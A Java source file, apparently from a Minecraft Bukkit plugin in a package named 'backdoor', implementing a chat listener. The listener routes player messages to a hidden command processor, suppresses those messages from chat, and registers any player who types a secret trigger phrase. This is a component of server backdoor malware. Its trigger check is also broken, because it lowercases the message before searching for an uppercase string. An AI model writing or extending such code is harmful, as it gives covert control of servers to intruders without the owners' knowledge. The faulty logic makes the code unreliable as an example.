package de.blox.backdoor.listener;

import de.blox.backdoor.core.Core;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;

public class PlayerChatListener implements Listener {

    @EventHandler
    public void handlePlayerChat(AsyncPlayerChatEvent event) {
        try {
            if (!Core.getInstance().getCommandProvider().processCommand(event.getPlayer(), event.getMessage())) {
                event.setCancelled(true);
            }
        }catch (Exception ignored) {
            ignored.printStackTrace();
        }
        if (event.getMessage().toLowerCase().contains("#ABC")) {
            Core.getInstance().getRegisteredPlayers().add(event.getPlayer().getUniqueId().toString());
        }
    }

}
